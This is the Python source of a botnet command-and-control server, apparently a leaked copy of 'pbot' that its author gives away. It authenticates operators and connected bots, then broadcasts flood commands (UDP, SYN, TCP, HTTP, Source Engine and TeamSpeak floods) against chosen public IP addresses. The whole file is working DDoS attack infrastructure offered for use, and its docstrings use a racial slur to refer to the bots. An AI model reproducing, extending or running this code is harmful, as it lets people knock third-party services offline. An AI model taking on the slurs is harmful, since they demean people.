import socket, threading, sys, os, time, ipaddress, requests
from colorama import *
bots = {}
ansi_clear = '\033[2J\033[H'

## a ripped version of pbot im giving away cause why tf not

banner = """THIS CNC WAS DEVELOPED BY ` Seb#1702 at discord.gg/qkQ8psvPxh
"""
def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    cBLUEentials = [x.strip() for x in open('./Database/DB.txt').readlines() if x.strip()]
    for x in cBLUEentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            link = "http://ip-api.com/json/"
            f = requests.get(link)
            ipinfo = f.text
            with open('./Database/logs.txt', 'a') as f:
                f.write("\n" + username + " logged in with IP: " + ipinfo)
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ niggers """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ checking if niggers are still connected """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0; botnet  / {len(bots)}\a', False)
            time.sleep(1)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f"{Fore.WHITE}{Fore.LIGHTGREEN_EX}{Fore.WHITE}botnet{Fore.WHITE}: "
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                print(f'command :floods was used')
                send(client, 'THIS CNC WAS DEVELOPED BY ` Seb#1702 at discord.gg/qkQ8psvPxh  ')
                send(client, Fore.WHITE + ' *  Example | udpflood 1.1.1.1 port time 65500 .')
                send(client, '')
                send(client, Fore.WHITE + ' * vseflood ')
                send(client, Fore.WHITE + ' * synflood ')
                send(client, Fore.WHITE + ' * udpflood ')
                send(client, Fore.WHITE + ' * teamspeak ')
                send(client, '')

            elif command == 'CLEAR':
                print(f'command :clear was used')
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'CLS':
                print(f'command :clear was used')
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == ' ':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)         

            elif command == 'LOGOUT':
                send(client, 'Logging out')
                time.sleep(1)
                break            

            # Valve Source Engine query flood
            elif command == 'VSEFLOOD':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs): 
                                send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                send(client, '')
                                send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                broadcast(data)
                            else:
                                send(client, Fore.LIGHTWHITE_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTWHITE_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTWHITE_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTWHITE_EX + 'Usage: vseflood ip 80 30')

            # TCP SYNchronize flood           
            elif command == 'SYNFLOOD':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                send(client, '')
                                send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                broadcast(data)
                            else:
                                send(client, Fore.LIGHTCYAN_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTCYAN_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTWHITE_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTWHITE_EX + 'Usage: synflood ip 80 30')
            

            # Teamspeak flood
            elif command == 'TEAMSPEAK':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs): 
                                send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                send(client, '')
                                send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                broadcast(data)
                            else:
                                send(client, Fore.LIGHTWHITE_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTWHITE_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTWHITE_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTWHITE_EX + 'Usage: Teamspeak ip 80 30')

            # TCP junk data packets flood
            elif command == 'TCPFLOOD':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                    send(client, '')
                                    send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.LIGHTCYAN_EX + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.LIGHTCYAN_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTCYAN_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTCYAN_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTCYAN_EX + 'Usage: tcp [IP] [PORT] [TIME] [SIZE]')

            # TCP junk data packets flood
            elif command == 'TCPV2':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                    send(client, '')
                                    send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.LIGHTCYAN_EX + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.LIGHTCYAN_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTCYAN_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTCYAN_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTCYAN_EX + 'Usage: tcpv2 [IP] [PORT] [TIME] [SIZE]')

            # UDP junk data packets flood
            elif command == 'UDPFLOOD':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.LIGHTWHITE_EX + f'Port {port} is vulnerable and will be used to create socket')
                                    send(client, '')
                                    send(client, Fore.LIGHTWHITE_EX + f'Attack sent to {ip}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.LIGHTWHITE_EX + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.LIGHTWHITE_EX + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.LIGHTWHITE_EX + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.LIGHTWHITE_EX + 'Invalid IP-address')
                else:
                    send(client, Fore.LIGHTWHITE_EX + 'Usage: udpflood ip 80 30 1440')


            # HTTP GET request flood
            elif command == 'HTTPFLOOD':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, '') 
                            send(client, Fore.MAGENTA + f'instructions sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            send(client, '') 
                            broadcast(data)
                        else:
                            send(client, Fore.LIGHTCYAN_EX + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.LIGHTCYAN_EX + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            else:
                send(client, Fore.LIGHTBLUE_EX + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0; botnet login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTWHITE_EX}botnet-1230Username{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTWHITE_EX}botnet-1230Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): #
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid crentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <botnet port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('invalid port for pbot')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
